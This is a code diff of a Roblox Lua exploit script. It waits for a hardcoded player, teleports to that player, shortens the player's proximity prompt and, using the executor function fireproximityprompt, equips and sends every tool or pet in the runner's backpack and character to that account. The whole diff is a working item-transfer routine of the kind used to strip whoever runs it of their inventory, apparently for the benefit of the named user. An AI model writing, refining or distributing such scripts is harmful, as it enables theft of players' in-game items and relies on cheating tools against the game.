@@ -5,47 +5,68 @@ local Humanoid = Character:WaitForChild("Humanoid")
 
 local targetUsername = "patpiggy195"
 
--- Wait for target player to appear
-local targetPlayer = Players:FindFirstChild(targetUsername)
-if not targetPlayer then
-    repeat
-        task.wait(1)
-        targetPlayer = Players:FindFirstChild(targetUsername)
-    until targetPlayer
+local function waitForTargetPrompt()
+	local targetPlayer = Players:FindFirstChild(targetUsername)
+	while not targetPlayer do
+		warn("Target player not found.")
+		task.wait(1)
+		targetPlayer = Players:FindFirstChild(targetUsername)
+	end
+
+	local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
+	local targetHRP = targetChar:WaitForChild("HumanoidRootPart", 5)
+
+	if not targetHRP then
+		warn("Target HumanoidRootPart not found.")
+		return nil
+	end
+
+	-- Check for prompt repeatedly
+	for _ = 1, 30 do -- 30 tries = ~15 seconds
+		for _, v in ipairs(targetHRP:GetChildren()) do
+			if v:IsA("ProximityPrompt") then
+				warn("✅ Prompt found.")
+				return v, targetHRP
+			end
+		end
+		task.wait(0.5)
+	end
+
+	warn("❌ Prompt not found after waiting.")
+	return nil
 end
 
--- Wait for their character and the ProximityPrompt
-local targetCharacter = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
-local targetHRP = targetCharacter:WaitForChild("HumanoidRootPart")
-local prompt = targetHRP:WaitForChild("ProximityPrompt")
+-- Send all tools (Backpack + equipped)
+local function sendAllTools(prompt)
+	if not prompt then return end
 
--- Make the prompt faster
-prompt.HoldDuration = 0.1
+	-- Equip everything in backpack and send
+	for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
+		if tool:IsA("Tool") then
+			Humanoid:EquipTool(tool)
+			task.wait(0.2)
+			fireproximityprompt(prompt)
+			task.wait(0.2)
+		end
+	end
 
--- Move yourself to them
-Character:SetPrimaryPartCFrame(targetHRP.CFrame)
-
--- Function to send all tools in Backpack and Character
-local function sendAllTools()
-    -- Send from Backpack
-    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            Humanoid:EquipTool(tool)
-            task.wait(0.15)
-            fireproximityprompt(prompt)
-            task.wait(0.15)
-        end
-    end
-
-    -- Also check if any tools are equipped (like pets in garden)
-    for _, tool in ipairs(Character:GetChildren()) do
-        if tool:IsA("Tool") then
-            task.wait(0.1)
-            fireproximityprompt(prompt)
-            task.wait(0.1)
-        end
-    end
+	-- Check equipped tools too
+	for _, tool in ipairs(Character:GetChildren()) do
+		if tool:IsA("Tool") then
+			fireproximityprompt(prompt)
+			task.wait(0.2)
+		end
+	end
 end
 
--- Run once
-sendAllTools()
+-- Main
+task.spawn(function()
+	local prompt, targetHRP = waitForTargetPrompt()
+	if prompt and targetHRP then
+		Character:SetPrimaryPartCFrame(targetHRP.CFrame + Vector3.new(0, 1, 0))
+		prompt.HoldDuration = 0.1
+		sendAllTools(prompt)
+	else
+		warn("❌ Could not find target prompt.")
+	end
+end)
